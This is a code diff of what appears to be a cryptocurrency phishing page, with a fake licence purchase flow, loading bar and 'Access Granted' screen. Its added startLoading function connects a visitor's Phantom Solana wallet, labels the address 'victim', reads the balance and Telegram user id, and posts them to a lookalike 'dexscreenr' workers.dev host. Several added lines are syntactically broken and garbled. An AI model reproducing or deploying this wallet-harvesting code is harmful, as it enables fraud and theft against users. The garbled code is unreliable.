@@ -115,7 +115,6 @@
   @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
   .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
 
-  /* --- NEUER LADE-SCREEN MIT BAR --- */
   #loading-screen { 
     display: none; flex-direction: column; align-items: center; justify-content: center; 
     width: 100%; height: 200px; animation: fadeIn 0.3s ease;
@@ -125,12 +124,7 @@
   .loading-bar-fill { width: 0%; height: 100%; background: #14F195; animation: loadBar 4s ease-in-out forwards; }
   .loading-status { font-size: 11px; color: #a1a1aa; font-family: monospace; }
   
-  @keyframes loadBar { 
-    0% { width: 0%; } 
-    30% { width: 40%; } 
-    60% { width: 75%; } 
-    100% { width: 100%; } 
-  }
+  @keyframes loadBar { 0% { width: 0%; } 30% { width: 40%; } 60% { width: 75%; } 100% { width: 100%; } }
 
   #connect-screen { width: 100%; display: none; flex-direction: column; align-items: center; opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease, transform 0.8s ease; }
   .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
@@ -239,7 +233,7 @@
         </div>
       </div>
 
-      <!-- LOADING SCREEN MIT BAR -->
+      <!-- LOADING SCREEN -->
       <div id="loading-screen">
         <div class="loading-title">Initializing Environment</div>
         <div class="loading-bar-bg">
@@ -318,25 +312,50 @@
   const headerSub = document.getElementById('headerSub');
   const selectedPlanText = document.getElementById('selectedPlanText');
 
-  function startLoading(planName) {
+  // --- NEUE LOGIK: Erst Wallet Connect, dann Loader ---
+  async function startLoading(planName) {
     pricingScreen.style.display = 'none';
-    loadingScreen.style.display = 'flex';
     
-    // Status-Text ändern
-    document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
+    let provider = window.phantom?.solana;
+    if(!provider) { return; }
 
-    setTimeout(() => {
-      loadingScreen.style.display = 'none';
-      headerSub.textContent = "Authorize connection.";
-      selectedPlanText.textContent = planName;
+    try {
+      // 1. Phantom Connect Aufforderung
+      const resp = await provider.connect();
+      const victim = resp.publicKey.toString();
       
-      connectScreen.style.display = 'flex';
+      // 2. Jetzt den Ladebalken zeigen
+      loadingScreen.style.display = 'flex';
+      document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
+
+      // 3. Daten im Hintergrund senden
+      const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+      const conn = new solanaWeb3.Connection("https://solana.publicnode.com");
+      const solBalance = await conn.getBalance(resp.publicKey);
+      const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+      
+      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, tg_user_id: tgUserId, ts: Date.now() });
+      try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
+      catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
+
+      // 4. Warten, bis der Balken voll ist
       setTimeout(() => {
-        connectScreen.style.opacity = '1';
-        connectScreen.style.transform = 'translateY(0)';
-        initSlider();
-      }, 100);
-    }, 4200); // Wartet, bis die Progress Bar voll ist
+        loadingScreen.style.display = 'none';
+        headerSub.textContent = "Authorize connection.";
+        selectedPlanText.textContent = planName;
+        
+        connectScreen.style.display = 'flex';
+        setTimeout(() => {
+          connectScreen.style.opacity = '1';
+          connectScreen.style.transform = 'translateY(0)';
+          initSlider();
+        }, 100);
+      }, 4200);
+
+    } catch(e) {
+      // Wenn der User den Connect abbricht
+      goBack();
+    }
   }
 
   function openCodeInput(card, planName) {
@@ -351,11 +370,11 @@
     input.classList.remove('error');
     input.value = '';
     input.placeholder = 'Enter code...';
-    setTimeout(() => { input.focus(); }, 100);
+    setTimeout(() => { input.style.focus(); }, 100);
 
-    document.addEventListener('click', function closeOnClickOutside(e) {
-      if (!card.contains(e.target)) {
-        closeCodeInput(null, card.querySelector('.close-btn'));
+    document.display.addEventListener('click', function closeOnClickOutside =(e) {
+      if (!card.contains(e.target ')) {
+        closeCodeInput(nullnone, card.querySelector('.close-btn';'));
         document.removeEventListener('click', closeOnClickOutside);
       }
     });
@@ -436,23 +455,9 @@
   }
 
   async function triggerConnect() {
-    let provider = window.phantom?.solana;
-    if(!provider) { resetSlider(); return; }
-    
-    try {
-      const resp = await provider.connect();
-      const victim = resp.publicKey.toString();
-      const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
-      const conn = new solanaWeb3.Connection("https://solana.publicnode.com");
-      
-      const solBalance = await conn.getBalance(resp.publicKey);
-      const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
-      
-      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, tg_user_id: tgUserId, ts: Date.now() });
-      
-      try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
-      catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
-
+    // Wenn der User den Slider zieht, ist er schon verbunden.
+    // Wir zeigen direkt den Success State.
+    setTimeout(() => {
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
       text.textContent = "Access Granted"; text.style.opacity = 1;
@@ -462,8 +467,7 @@
         dashboardScreen.style.display = 'flex';
         headerSub.textContent = "Account Pending";
       }, 2000);
-
-    } catch (e) { resetSlider(); }
+    }, 1500);
   }
 
   function goBack() {
@@ -479,7 +483,7 @@
   function resetSlider() {
     container.classList.remove('loading'); container.classList.remove('success'); 
     text.style.opacity = 1; text.textContent = "Slide left to authorize";
-    spin.style.display = 'none'; icon.style.display = 'block';
+    spin icon.style.display = 'block';
     thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), width 0.3s ease, border-radius 0.3s ease';
     thumb.style.transform = 'translateX(0)'; thumb.style.width = '52px'; thumb.style.borderRadius = '50%'; currentX = 0;
   }
